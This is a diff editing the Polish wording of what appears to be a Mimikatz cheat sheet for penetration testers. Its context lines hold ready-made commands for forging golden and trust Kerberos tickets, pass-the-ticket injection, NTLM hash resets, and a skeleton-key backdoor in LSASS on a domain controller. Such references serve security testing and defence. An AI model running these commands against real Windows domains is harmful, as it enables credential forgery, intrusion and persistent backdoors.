@@ -79,9 +79,9 @@ Przykład:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Tworzenie Biletu Zaufania
+### Tworzenie Zaufanego Biletu
 
-Bilety Zaufania są używane do uzyskiwania dostępu do zasobów w różnych domenach poprzez wykorzystanie relacji zaufania. Kluczowe polecenie i parametry:
+Zaufane Bilety są używane do uzyskiwania dostępu do zasobów w różnych domenach poprzez wykorzystanie relacji zaufania. Kluczowe polecenie i parametry:
 
 - Polecenie: Podobne do Złotego Biletu, ale dla relacji zaufania.
 - Parametry:
@@ -99,19 +99,19 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Polecenie: `kerberos::list`
 - Wyświetla wszystkie bilety Kerberos dla bieżącej sesji użytkownika.
 
-- **Przekaż pamięć podręczną**:
+- **Przekazywanie pamięci podręcznej**:
 
 - Polecenie: `kerberos::ptc`
 - Wstrzykuje bilety Kerberos z plików pamięci podręcznej.
 - Przykład: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Przekaż bilet**:
+- **Przekazywanie biletu**:
 
 - Polecenie: `kerberos::ptt`
 - Umożliwia użycie biletu Kerberos w innej sesji.
 - Przykład: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Oczyść bilety**:
+- **Czyszczenie biletów**:
 - Polecenie: `kerberos::purge`
 - Czyści wszystkie bilety Kerberos z sesji.
 - Przydatne przed użyciem poleceń manipulacji biletami, aby uniknąć konfliktów.
@@ -147,12 +147,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnieniu zaufania.
+- **LSADUMP::Trust**: Pobiera informacje o uwierzytelnianiu zaufania.
 - `mimikatz "lsadump::trust" exit`
 
 ### Różne
 
-- **MISC::Skeleton**: Wstrzykuje tylne wejście do LSASS na DC.
+- **MISC::Skeleton**: Wstrzykuje backdoora do LSASS na DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Eskalacja uprawnień
@@ -178,7 +178,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SID::add/modify**: Zmienia SID i SIDHistory.
 
 - Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Zmień: _Brak konkretnego polecenia do zmiany w oryginalnym kontekście._
+- Zmień: _Brak konkretnego polecenia dla zmiany w oryginalnym kontekście._
 
 - **TOKEN::Elevate**: Podszywa się pod tokeny.
 - `mimikatz "token::elevate /domainadmin" exit`
